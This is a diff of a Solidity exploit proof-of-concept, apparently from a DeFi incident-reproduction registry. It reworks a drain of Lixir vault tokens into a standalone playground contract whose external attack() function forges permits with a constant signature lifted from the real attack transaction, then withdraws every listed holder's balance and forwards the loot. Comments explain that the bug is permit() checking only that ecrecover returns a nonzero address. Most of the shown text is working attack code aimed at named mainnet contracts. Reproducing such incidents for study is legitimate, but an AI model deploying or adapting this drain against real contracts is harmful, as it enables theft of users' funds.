@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.15;
 
-import "../basetest.sol";
 import "../interface.sol";
 
 // @KeyInfo - Total Lost : 2.60 ETH, 4,477.72 USDC, 3,609.95 USDT, 24,182.56 LIX
@@ -12,17 +11,35 @@ import "../interface.sol";
 // Attack Tx : https://etherscan.io/tx/0x17026faca0b8e4cb7531e4fb277c390eb165e81229628e0192923ad1d90a41da
 
 // @Info
-// Vulnerable Contract Code : https://etherscan.io/address/0xfD4c9a491DD777b8b3e13659e9E379252eC78390#code
+// Vulnerable Contract Code : NOT source-verified on Etherscan (both the proxy and
+// the shared logic return UNVERIFIED). The permit() logic quoted in the writeup
+// (evm-hack-registry/2026-06-LixirPermitDrain_exp/LixirPermitDrain_exp.md) is
+// RECONSTRUCTED FROM THE -vvvvv TRACE, so this playground cannot show Lixir's own
+// source for the vulnerable line - it renders as raw opcodes. The vulnerability
+// locator below anchors on THIS contract's own forged-permit call site instead.
 
 // @Analysis
 // Twitter Guy : https://x.com/DefimonAlerts/status/2070362661691207935
 //
 // Lixir vault-token permits accepted a dummy signature as long as ecrecover returned a nonzero address.
 // The attacker used the forged permit allowance to withdraw each holder's full vault-token balance.
-
-address constant ATTACKER = 0x3Fa8cF7FeA68C8E76A9838d77889464DdFb6a6cf;
-address constant HISTORICAL_ATTACK_CONTRACT = 0xEFd1b12F5E3c35D7daE0D1449674C247566f9b76;
-address constant BLOCK_MINER = 0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97;
+//
+// Standalone playground version: the real/registry PoC (test/LixirPermitDrain_exp.sol)
+// runs the entire drain inside the LixirPermitDrain constructor via `new
+// LixirPermitDrain(...)`, so the playground's recorder (which records ONE
+// attackFunction call, not a deploy) can't step through it. This version is
+// identical in every attack mechanic - same forged (v,r,s) constant, same vault
+// list, same holder lists, same withdraw calls, same coinbase bribe - but moves
+// the whole sequence out of the constructor into a plain external `attack()` so
+// it can be deployed first and then recorded as the attackFunction call.
+//
+// No `vm.sign` / offline-signature derivation was needed here (unlike some other
+// permit-forgery PoCs): the bug is that Lixir's permit() only checks
+// `ecrecover(...) != address(0)`, never `== owner`. ecrecover returns SOME valid
+// point on the curve for ANY well-formed (v in {27,28}, r, s) regardless of the
+// digest, so the exact same constant (v=28, r, s) - lifted straight from the
+// registry PoC/on-chain trace - satisfies the buggy check against every owner's
+// digest without needing to correspond to any real signer's key at all.
 
 address constant TOKEN_USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
 address constant TOKEN_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
@@ -66,64 +83,23 @@ interface ILixirVaultToken {
     ) external returns (uint256 amount0, uint256 amount1);
 }
 
-contract ContractTest is BaseTestWithBalanceLog {
-    function setUp() public {
-        uint256 forkBlock = 25_391_315;
-        vm.createSelectFork("http://127.0.0.1:8545", forkBlock);
-        vm.coinbase(BLOCK_MINER);
-
-        attacker = ATTACKER;
-        multiAssetLog = true;
-        _addFundingToken(address(0));
-        _addFundingToken(TOKEN_USDC);
-        _addFundingToken(TOKEN_USDT);
-        _addFundingToken(TOKEN_LIX);
-
-        vm.label(ATTACKER, "Attacker");
-        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack contract");
-        vm.label(BLOCK_MINER, "Block beneficiary");
-        vm.label(TOKEN_USDC, "USDC");
-        vm.label(TOKEN_USDT, "USDT");
-        vm.label(TOKEN_LIX, "LIX");
-        vm.label(LV_WETH_USDC_A, "Lixir lv_WETH-USDC A");
-        vm.label(LV_LIX_WETH_A, "Lixir lv_LIX-WETH A");
-        vm.label(LV_WETH_USDC_B, "Lixir lv_WETH-USDC B");
-        vm.label(LV_LIX_WETH_B, "Lixir lv_LIX-WETH B");
-        vm.label(LV_USDC_USDT_A, "Lixir lv_USDC-USDT A");
-        vm.label(LV_USDC_USDT_B, "Lixir lv_USDC-USDT B");
-    }
-
-    function testExploit() public balanceLog {
-        uint256 attackerEthBefore = ATTACKER.balance;
-        uint256 attackerUsdcBefore = IERC20(TOKEN_USDC).balanceOf(ATTACKER);
-        uint256 attackerUsdtBefore = IERC20(TOKEN_USDT).balanceOf(ATTACKER);
-        uint256 attackerLixBefore = IERC20(TOKEN_LIX).balanceOf(ATTACKER);
-        uint256 minerEthBefore = BLOCK_MINER.balance;
-
-        // step 1: deploy a fresh helper that performs the forged-permit drain during construction.
-        vm.prank(ATTACKER);
-        LixirPermitDrain drain = new LixirPermitDrain(payable(ATTACKER));
-        vm.label(address(drain), "Local drain helper");
-
-        // step 2: prove the same final profit path as the trace.
-        assertGt(ATTACKER.balance, attackerEthBefore, "attacker ETH profit");
-        assertGt(IERC20(TOKEN_USDC).balanceOf(ATTACKER), attackerUsdcBefore, "attacker USDC profit");
-        assertGt(IERC20(TOKEN_USDT).balanceOf(ATTACKER), attackerUsdtBefore, "attacker USDT profit");
-        assertGt(IERC20(TOKEN_LIX).balanceOf(ATTACKER), attackerLixBefore, "attacker LIX profit");
-        assertEq(BLOCK_MINER.balance - minerEthBefore, 0.015 ether, "builder payment");
-    }
-}
-
 contract LixirPermitDrain {
+    // Constant forged ECDSA signature. This is NOT signed by anyone - it is just
+    // a well-formed (v, r, s) copied from the real attack tx. Because Lixir's
+    // permit() never compares the recovered signer to `owner`, ANY well-formed
+    // signature satisfies it for every victim's digest.
     uint8 private constant V = 28;
     bytes32 private constant R = 0xe7C93726a865578504442b1A6827f676E0ED74BDff2be3960d1e253bbcfc4462;
     bytes32 private constant S = 0x6AA772b878Bc912BdBB33a0014eC507c4B3896ea85aa914b74dee9b7ac3e56da;
 
     receive() external payable {}
 
-    constructor(
+    // Recorded entrypoint. Runs the exact same sequence the real constructor did:
+    // forge a permit + withdraw against every known holder of all six vaults,
+    // forward the loot to `receiver`, pay the block builder its bribe.
+    function attack(
         address payable receiver
-    ) {
+    ) external {
         // step 1: drain WETH-bearing vaults with forged permits, receiving unwrapped ETH plus ERC20 assets.
         _drainETHVault(LV_WETH_USDC_A, _lvWethUsdcAHolders());
         _drainETHVault(LV_LIX_WETH_A, _lvLixWethAHolders());
@@ -154,6 +130,9 @@ contract LixirPermitDrain {
             uint256 shares = ILixirVaultToken(vault).balanceOf(holders[i]);
             if (shares == 0) continue;
 
+            // THE BUG: the vault's permit() only requires ecrecover(...) != address(0);
+            // it never checks the recovered signer == `holders[i]`. This forged,
+            // never-actually-signed-by-the-owner (v, r, s) is accepted anyway.
             ILixirVaultToken(vault).permit(holders[i], address(this), shares, type(uint256).max, V, R, S);
             ILixirVaultToken(vault).withdrawETHFrom(holders[i], shares, 0, 0, address(this), type(uint256).max);
         }
